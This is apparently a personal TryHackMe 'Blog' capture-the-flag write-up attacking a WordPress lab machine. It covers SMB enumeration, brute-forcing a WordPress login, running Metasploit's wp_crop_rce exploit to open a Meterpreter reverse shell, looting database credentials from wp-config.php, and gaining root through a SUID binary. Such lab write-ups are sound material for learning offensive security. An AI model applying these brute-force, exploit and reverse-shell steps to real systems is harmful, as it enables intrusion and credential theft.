# TryHackMe: Blog

## Recon

WordPress blog.
Theme is:
```
Theme Name: Twenty Twenty
Text Domain: twentytwenty
Version: 1.3
```

2 users
- bjoel
- kwheel

kwheel is the mom of bjoel.

Can traverse directory

```
http://blog.thm/wp-includes/
```

## Nmap

4 services
- SSH
- HTTP
- Samba 139
- Samba 445

```shell
kali@kali:~/Desktop/repos/ctf/try-hack-me/blog$ nmap blog.thm -A -p- -v | tee nmap.txt
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-05 00:10 BST
Scanning blog.thm (10.10.177.153) [65535 ports]
Discovered open port 80/tcp on 10.10.177.153
Discovered open port 445/tcp on 10.10.177.153
Discovered open port 139/tcp on 10.10.177.153
Discovered open port 22/tcp on 10.10.177.153
Scanning 4 services on blog.thm (10.10.177.153)
Nmap scan report for blog.thm (10.10.177.153)
Host is up (0.058s latency).
Not shown: 65531 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
|_http-generator: WordPress 5.0
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry
|_/wp-admin/
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Completed NSE at 00:10, 0.00s elapsed
Initiating NSE at 00:10
Completed NSE at 00:10, 0.01s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.68 seconds
```

## Enumerate SMB

```shell

kali@kali:~/Desktop/repos/ctf/try-hack-me/blog$ nmap --script smb-enum-shares.nse -p445 blog.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-05 00:15 BST
Nmap scan report for blog.thm (10.10.177.153)
Host is up (0.019s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares:
|   account_used: guest
|   \\10.10.177.153\BillySMB:
|     Type: STYPE_DISKTREE
|     Comment: Billy's local SMB Share
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\srv\smb\files
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.177.153\IPC$:
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (blog server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.177.153\print$:
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 4.06 seconds
```
Samba services have Anonymous READ/WRITE access.

```shell
kali@kali:~/Desktop/repos/ctf/try-hack-me/blog$ smbclient \\\\10.10.177.153\\BillySMB
Enter WORKGROUP\kali's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Oct  5 00:15:26 2020
  ..                                  D        0  Tue May 26 18:58:23 2020
  Alice-White-Rabbit.jpg              N    33378  Tue May 26 19:17:01 2020
  tswift.mp4                          N  1236733  Tue May 26 19:13:45 2020
  check-this.png                      N     3082  Tue May 26 19:13:43 2020

                15413192 blocks of size 1024. 9790364 blocks available
smb: \>
```

Despite have read/write access, Samba turned out to be a rabbit hole.

Instead, we can bruteforce with wp-scan.

## WPScan output




## Wordpress brute forcing

Started with wpscan.
Was too slow.
Moved to msfconsole.
Used auxiliary/webapps/login.

```
msf5 auxiliary(scanner/http/wordpress_xmlrpc_login) >
```

Using previously enumerated users: bjoel, kwhell.
Bruteforced with rockyou.txt.
`bjoel` didn't complete, gave up, tried `kwheel`.

```shell
[+] 10.10.220.183:80 - Success: 'kwheel:cutiepie1'
```
## Admin panel access

Logged in as `kwheel`.
User is not privileged.
Perhaps can find some upload RCE.

`kwheel` has some wierd post in drafts.

```
jiXvfuIpdw
```

## Metasploit WP Image-Crop RCE

Tried to manually exploit image upload, but sanitized too well on WP.
Metasploit has an exploit for image upload RCE bypass.

```shell
msf5 exploit(multi/http/wp_crop_rce) >
```

```
Module options (exploit/multi/http/wp_crop_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   cutiepie1        yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   USERNAME   kwheel           yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress


msf5 exploit(multi/http/wp_crop_rce) > set rhosts 10.10.88.118
rhosts => 10.10.88.118
msf5 exploit(multi/http/wp_crop_rce) > set lhost tun0
lhost => tun0
msf5 exploit(multi/http/wp_crop_rce) > run

[*] Started reverse TCP handler on 10.11.8.219:4444
[*] Authenticating with WordPress using kwheel:cutiepie1...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload
[+] Image uploaded
[*] Including into theme
[*] Sending stage (38288 bytes) to 10.10.88.118
[*] Meterpreter session 1 opened (10.11.8.219:4444 -> 10.10.88.118:37830) at 2020-10-06 21:09:53 +0100
[*] Attempting to clean up files...

meterpreter > ls
Listing: /var/www/wordpress
===========================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100640/rw-r-----  235    fil   2020-05-28 13:15:42 +0100  .htaccess
100640/rw-r-----  235    fil   2020-05-28 04:44:26 +0100  .htaccess_backup
100644/rw-r--r--  1112   fil   2020-10-06 21:09:52 +0100  bNrODQuydU.php
100640/rw-r-----  418    fil   2013-09-25 01:18:11 +0100  index.php
100640/rw-r-----  19935  fil   2020-05-26 16:39:37 +0100  license.txt
100640/rw-r-----  7415   fil   2020-05-26 16:39:37 +0100  readme.html
100640/rw-r-----  5458   fil   2020-05-26 16:39:37 +0100  wp-activate.php
40750/rwxr-x---   4096   dir   2018-12-06 18:00:07 +0000  wp-admin
100640/rw-r-----  364    fil   2015-12-19 11:20:28 +0000  wp-blog-header.php
100640/rw-r-----  1889   fil   2018-05-02 23:11:25 +0100  wp-comments-post.php
100640/rw-r-----  2853   fil   2015-12-16 09:58:26 +0000  wp-config-sample.php
100640/rw-r-----  3279   fil   2020-05-28 04:49:17 +0100  wp-config.php
40750/rwxr-x---   4096   dir   2020-05-26 04:52:32 +0100  wp-content
100640/rw-r-----  3669   fil   2017-08-20 05:37:45 +0100  wp-cron.php
40750/rwxr-x---   12288  dir   2018-12-06 18:00:08 +0000  wp-includes
100640/rw-r-----  2422   fil   2016-11-21 02:46:30 +0000  wp-links-opml.php
100640/rw-r-----  3306   fil   2017-08-22 12:52:48 +0100  wp-load.php
100640/rw-r-----  37286  fil   2020-05-26 16:39:37 +0100  wp-login.php
100640/rw-r-----  8048   fil   2017-01-11 05:13:43 +0000  wp-mail.php
100640/rw-r-----  17421  fil   2018-10-23 08:04:39 +0100  wp-settings.php
100640/rw-r-----  30091  fil   2018-04-30 00:10:26 +0100  wp-signup.php
100640/rw-r-----  4620   fil   2017-10-23 23:12:51 +0100  wp-trackback.php
100640/rw-r-----  3065   fil   2016-08-31 17:31:29 +0100  xmlrpc.php

meterpreter >
```

## Got access

Check wordpress files.
- wp-config.php; stores mysql creds, functions, php variables.

```php
/* Custom */
/*
define('WP_HOME', '/');
define('WP_SITEURL', '/'); */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'blog');

/** MySQL database username */
define('DB_USER', 'wordpressuser');

/** MySQL database password */
define('DB_PASSWORD', 'ittleYellowLamp90!@');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');
```

## Looting before privesc

/etc/passwd
```shell
bjoel:x:1000:1000:Billy Joel:/home/bjoel:/bin/bash
````


## Found rabbit hole on bjoel

user.txt flag returns `This is a rabbit hole`.

## Find SUID software

Wierd program in user sbin.
Some linux ELF binary. 

Ran `strings` against binary.
Shows some string contains `/bin/bash` but says `Not an Admin` on running.

Can potentially be exploited for `/bin/bash/` execution as has SUID.

## Looting MySQL

Found WordPress hashed passwords.
For `bjoel` and `kwheel`.

## Decompiling SUID

Found some binary `/usr/sbin/checker` that runs `/bin/bash`.
The condition is that the `/admin` export PATH is set.

We set the /admin path variable.

Then ran `/usr/sbin/checker`.
This gave us `root` as check `root` SUID.

## Flags

- root.txt
	```
	cat /root/root.txt
	``` 
- user.txt
	```
	cat /media/usb/user.txt
	```







